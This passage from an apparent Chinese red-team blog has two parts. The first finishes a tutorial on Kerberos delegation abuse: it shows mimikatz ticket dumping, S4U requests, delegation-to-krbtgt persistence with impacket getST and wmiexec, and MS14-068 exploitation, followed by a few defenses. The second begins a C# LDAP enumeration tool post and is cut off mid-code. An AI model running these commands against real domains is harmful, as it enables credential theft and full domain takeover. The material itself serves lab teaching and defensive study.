+<h3 id="5-访问域控"><a href="#5-访问域控" class="headerlink" title="5.访问域控"></a>5.访问域控</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/3849bd3749fdc3c6.png"></p>
+<h3 id="6-不知道服务用户密码的情况"><a href="#6-不知道服务用户密码的情况" class="headerlink" title="6.不知道服务用户密码的情况"></a>6.不知道服务用户密码的情况</h3><p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/32315ac3eaaa51e7.png"></p>
+<p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p>
+<p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;3e7]-2-1-40e00000-PC-JACK-0DAY$@krbtgt-0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/520862a3fca0f03a.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/674d9b5f7db26eac.png"></p>
+<h2 id="抓包分析约束性委派攻击过程"><a href="#抓包分析约束性委派攻击过程" class="headerlink" title="抓包分析约束性委派攻击过程"></a>抓包分析约束性委派攻击过程</h2><p>这里可以看到有6个请求</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/fdf55a024a0e2d75.png"></p>
+<h3 id="1-AS-REQ"><a href="#1-AS-REQ" class="headerlink" title="1.AS-REQ"></a>1.AS-REQ</h3><p>可以看到用户PC-JACK-0DAY用户向KDC请求一张TGT</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/6ac29afd418a3ca3.png"></p>
+<h3 id="2-AS-REP"><a href="#2-AS-REP" class="headerlink" title="2.AS-REP"></a>2.AS-REP</h3><p>返回一张TGT，这张TGT代表的就是PC-JACK-0DAY这个用户</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/c43b50536f56c3cb.png"></p>
+<h3 id="3-第一次的TGS-REQ和TGS-REP"><a href="#3-第一次的TGS-REQ和TGS-REP" class="headerlink" title="3.第一次的TGS-REQ和TGS-REP"></a>3.第一次的TGS-REQ和TGS-REP</h3><p>用这张<code>TGT</code>发送<code>S4U2self</code>请求，以<code>Administrator</code>的名义向<code>TGS</code>申请了一张访问自身服务的票据，ST1</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/9b0f1294d54499d1.png"></p>
+<h3 id="4-第二次的TGS-REQ和TGS-REP"><a href="#4-第二次的TGS-REQ和TGS-REP" class="headerlink" title="4.第二次的TGS-REQ和TGS-REP"></a>4.第二次的TGS-REQ和TGS-REP</h3><p>得到<code>ST1</code>之后，然后会带上ST1再次向<code>KDC</code>发起<code>SU42Proxy</code>请求，以<code>administrator</code>的名义请求一张访问<code>OWA2010SP3 cifs</code>服务的票据，ST2</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/be12dbc860533c57.png"></p>
+<h2 id="利用约束性委派进行权限维持"><a href="#利用约束性委派进行权限维持" class="headerlink" title="利用约束性委派进行权限维持"></a>利用约束性委派进行权限维持</h2><p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p>
+<p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p>
+<p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p>
+<p>我们可以使用powershell来添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser test -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/0day.org&quot;) &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们控制的用户选择的是自己创建的 test 域用户。密码Yicunyiye123</p>
+<ul>
+<li><p>域控：OWA2010SP3 192.168.200.146</p>
+</li>
+<li><p>域：0day.org</p>
+</li>
+<li><p>攻击机：Kali</p>
+</li>
+</ul>
+<p>首先修改 kali 的/etc/hosts/文件，添加如下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.146 0day.org</span><br><span class="line">192.168.200.146 OWA2010SP3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/29cfd70e8838071f.png"></p>
+<p>创建域用户test然后赋予SPN</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/f3019bb1515e3b1f.png"></p>
+<p>然后在域控上配置test用户到krbtgt用户的约束性委派。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser test -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/0day.org&quot;) &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/5ff11100576d9d5c.png"></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/6dacfd8c0def0e6e.png"></p>
+<p>可以看到test账户具有委派性</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/8222261fd19b023e.png"></p>
+<p>然后在kali上攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.200.146 -spn krbtgt/0day.org -impersonate administrator 0day.org/test:Yicunyiye123</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/136c713f90558177.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 wmiexec.py -no-pass -k administrator@OWA2010SP3 -dc-ip 192.168.200.146</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/4675dd9fc71fcfc7.png"></p>
+<h2 id="域委派的防御措施"><a href="#域委派的防御措施" class="headerlink" title="域委派的防御措施"></a>域委派的防御措施</h2><p>因为委派比较实用我们也不能说直接简单粗暴关闭该功能。</p>
+<p>1.高权限用户可以设置不能被委派</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/ac6bfda4d4ba45f1.png"></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/6fcd4c0c5cdc6ae5.png"></p>
+<p>可以看到administrator是无法成功的，但是sqladmin可以</p>
+<p>2.Windows 2012 R2及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组，当这个组内的用户登录时（windows 2012 R2域服务器，客户端必须为Windows 8.1或之上），不能使用NTLM认证；适用于<code>Windows Server 2016</code>，<code>Windows Server 2012 R2</code>、 <code>Windows Server 2012</code></p>
+<p>3.一般TGT 4小时后失效</p>
+<p>4.Kerberos预认证时不使用DES或者RC4等加密算法；</p>
+<h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><p>具体查看：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192810#h2-1">Windows内网协议学习Kerberos篇之PAC</a></p>
+<p>kerberos的流程：</p>
+<p>1.用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据</p>
+<p>2.用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</p>
+<p>3.用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</p>
+<p>上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p>
+<p>在Kerberos最初设计的流程里说明了如何证明客户端的真实身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。所以微软为了解决权限这个问题，引入了 PAC (Privilege Attribute Certificate，特权属性证书) 的概念。</p>
+<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo |find &quot;3011780&quot;</span><br></pre></td></tr></table></figure>
+
+<p>为空说明该服务器存在MS14-068漏洞</p>
+<p>环境：</p>
+<p>域机器：PC-JACK-0DAY，win7，知道一个域用户和密码：jack\0day，admin!@#45，拥有该机器的管理员权限</p>
+<p>域控：OWA2010SP3，ip:192.168.3.142</p>
+<p><strong>1.生成票据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u jack@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142  </span><br><span class="line">#MS14-068.exe -u 域用户@0day.org -p 域用户jack密码 -s 域用户jack的SID -d 域控ip</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/b7b9d716c74d6bda.png"></p>
+<p>可以看到生成了<a href="mailto:&#84;&#71;&#84;&#x5f;&#x6a;&#x61;&#x63;&#x6b;&#x40;&#48;&#x64;&#x61;&#121;&#x2e;&#x6f;&#x72;&#x67;&#46;&#99;&#x63;&#x61;&#99;&#x68;&#101;">&#84;&#71;&#84;&#x5f;&#x6a;&#x61;&#x63;&#x6b;&#x40;&#48;&#x64;&#x61;&#121;&#x2e;&#x6f;&#x72;&#x67;&#46;&#99;&#x63;&#x61;&#99;&#x68;&#101;</a></p>
+<p><strong>2.mimikatz导入票据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/c80cbb20e7d7478d.png"></p>
+<p><strong>3.访问域控</strong></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/861831303e5a0909.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/02/csharp%E6%93%8D%E4%BD%9Cldap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/10/02/csharp%E6%93%8D%E4%BD%9Cldap/" itemprop="url">c#操作ldap</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-02T19:59:30+08:00">
+                2021-10-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/yicunyiye/FuckLdap">https://github.com/yicunyiye/FuckLdap</a></p>
+<h1 id="0x01-Ldap连接"><a href="#0x01-Ldap连接" class="headerlink" title="0x01 Ldap连接"></a>0x01 Ldap连接</h1><p>我们常规的ldap查询例如ldapsearch</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot;</span><br></pre></td></tr></table></figure>
+
+<p>ldap连接地址为：ldap://192.168.11.16<br>用户为hack<br>密码为test123..<br>​</p>
+<p>在域外我们需要指定ip地址，在域内我们只需要指定域名也行，例如测试环境的redteam，也就是ldap://redteam,这里就说明我们写代码的时候就需要考虑是在域内还是在域外。<br>​</p>
+<p>在c#进行ldap连接的时候需要引入DirectoryServices.dll，这个是系统自带的，自行寻找。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using System.DirectoryServices</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img16@main/2021/10/01/1633088382782-d3a0a9b9-15de-489a-bc32-46606b902e64.png"></p>
+<h2 id="1-1域外连接"><a href="#1-1域外连接" class="headerlink" title="1.1域外连接"></a>1.1域外连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string url = &quot;LDAP://192.168.11.16/&quot;;</span><br><span class="line">string username = &quot;hack&quot;;</span><br><span class="line">string password = &quot;test123..&quot;;</span><br><span class="line">DirectoryEntry coon = new DirectoryEntry(url,username, password);</span><br></pre></td></tr></table></figure>
+
+
+<p>DirectoryEntry类可封装 Active Directory 域服务层次结构中的节点或对象。<br>​</p>
+<h2 id="1-2-域内连接"><a href="#1-2-域内连接" class="headerlink" title="1.2 域内连接"></a>1.2 域内连接</h2><p>如果是在域内，我们直接可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryEntry coon = new DirectoryEntry();</span><br></pre></td></tr></table></figure>
+
+
+<p>所以我们就要判断下两种情况。我们知道了要用coon来获取节点列表，用search来进行条件查询。我们可以写两个方法来进行获取：<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//域内</span><br><span class="line">public static DirectoryEntry Get_coon_nopass()</span><br><span class="line">&#123;</span><br><span class="line">    coon = new DirectoryEntry();</span><br><span class="line">    return coon;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static DirectorySearcher Get_search_nopass()</span><br><span class="line">&#123;</span><br><span class="line">    search = new DirectorySearcher(coon);</span><br><span class="line">    return search;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//域外</span><br><span class="line">public static void SET_LDAP_USER_PASS()</span><br><span class="line">&#123;</span><br><span class="line">    url = &quot;LDAP://&quot; + GetArgsValue.domain;</span><br><span class="line">    username = GetArgsValue.user;</span><br><span class="line">    password = GetArgsValue.pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static DirectoryEntry Get_coon()</span><br><span class="line">&#123;</span><br><span class="line">    coon = new DirectoryEntry(url, username, password);</span><br><span class="line">    return coon;</span><br><span class="line">&#125;</span><br><span class="line">public static DirectorySearcher Get_search()</span><br><span class="line">&#123;</span><br><span class="line">    search = new DirectorySearcher(coon);</span><br><span class="line">    return search;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>域内很好理解，这里来说下域外。<br>SET_LDAP_USER_PASS()这个方法用来获取url，username，password，然后调用了GetArgsValue类里面的属性。<br>​</p>
+<p>这里我用了NDesk.Options来处理获取的参数。<br>​</p>
+<p>先定义三个list<string></string></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;string&gt; domains = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; users = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; passes = new List&lt;string&gt;();</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;t|target=&quot;, &quot;the &#123;Target&#125; of the needed to add user&quot;,v =&gt; adduser.Add (v) &#125;,</span><br><span class="line">&#123; &quot;d|domain=&quot;, &quot;the &#123;IP&#125; of the target&quot;,v =&gt; domains.Add (v) &#125;,</span><br><span class="line">&#123; &quot;u|user=&quot;, &quot;the &#123;user&#125; of the target&quot;,v =&gt; users.Add (v) &#125;,</span><br></pre></td></tr></table></figure>
+
+
+<p>这里的意思就是当用户输入-t -d -u 后面接受的值分别传递给了domains,users,passes。<br>​</p>
+<p>然后写了个GetArgsValue类来存储这些值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    public static string domain = &quot;&quot;;</span><br><span class="line">    public static string user = &quot;&quot;;</span><br><span class="line">    public static string pass = &quot;&quot;;</span><br><span class="line">public static void GetDomainValue(List&lt;string&gt; param1 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param1)</span><br><span class="line">        &#123;</span><br><span class="line">            domain = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GetUserValue(List&lt;string&gt; param2 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param2)</span><br><span class="line">        &#123;</span><br><span class="line">            user = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GetPassValue(List&lt;string&gt; param3 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param3)</span><br><span class="line">        &#123;</span><br><span class="line">            pass = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在主函数调用了一下方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//domain ip</span><br><span class="line">GetArgsValue.GetDomainValue(domains);</span><br><span class="line">//domain user</span><br><span class="line">GetArgsValue.GetUserValue(users);</span><br><span class="line">//domain pass</span><br><span class="line">GetArgsValue.GetPassValue(passes);</span><br></pre></td></tr></table></figure>
+
+
+<p>那么当用户输入的值就会存储在GetArgsValue类里面的3个字段里。现在看到一下就很好理解了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;LDAP://&quot; + GetArgsValue.domain;</span><br><span class="line">username = GetArgsValue.user;</span><br><span class="line">password = GetArgsValue.pass;</span><br></pre></td></tr></table></figure>
+
+
+<p>域内外连接都写了，然后就要写一个方法来接受我们的连接。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public static void LDAP_COON()</span><br><span class="line">&#123;</span><br><span class="line">    if(GetArgsValue.user == &quot;&quot; &amp;&amp; GetArgsValue.pass == &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            coon = Get_coon_nopass();</span><br><span class="line">            search = Get_search_nopass();</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123;</span><br><span class="line">            Font.Warning();</span><br><span class="line">            Console.WriteLine(&quot;connection ldap fail&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else if(GetArgsValue.user != &quot;&quot; &amp;&amp; GetArgsValue.pass != &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            SET_LDAP_USER_PASS();</span><br><span class="line">            coon = Get_coon();</span><br><span class="line">            search = Get_search();</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123;</span><br><span class="line">            Font.Warning();</span><br><span class="line">            Console.WriteLine(&quot;connection ldap fail&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我的方法就是当GetArgsValue.user和GetArgsValue.pass的值为空的时候就会执行域内连接方法，否则就为域外。<br>​</p>
+<p>我们把这个连接方法封装到Ldapcoon类里面，方便后面的调用</p>
+<p>当在域外输入以下就会连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.exe -d 192.168.11.16 -u hack -p test123..</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="0x02-Filter搜索条件"><a href="#0x02-Filter搜索条件" class="headerlink" title="0x02 Filter搜索条件"></a>0x02 Filter搜索条件</h1><p>这里只会讲一些我们需要用到的一些语法，其他语法如果感兴趣可以自行搜索下。<br>​</p>
+<p>这里先举例获取域内用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass=user)(objectCategory=person))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088403409-a17bedc5-51c2-4167-b886-ed174fbb3efc.png"></p>
+<p>在c#中DirectorySearcher类的作用是对 Active Directory 域服务执行查询<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot);</span><br><span class="line"></span><br><span class="line">searchRoot</span><br><span class="line">DirectoryEntry</span><br><span class="line">Active Directory 域服务层次结构中的节点，从该节点处开始搜索。 SearchRoot 属性初始化为该值。</span><br></pre></td></tr></table></figure>
+
+
+<p>设置filter为查询域内所有用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DirectorySearcher search = new DirectorySearcher(coon);</span><br><span class="line">search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">foreach (SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                &#125;</span><br><span class="line">                catch</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;error&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里name值如何而来，我其实是这样看的：<br>我们先用ldapsearch执行该语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img1@main/2021/10/01/1633088414936-2b98ffe1-f2ae-43bd-9d52-fb402991021b.png"></p>
+<p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.DirectoryServices;</span><br><span class="line"></span><br><span class="line">namespace DemoLdap</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            string url = &quot;LDAP://192.168.11.16&quot;;</span><br><span class="line">            string username = 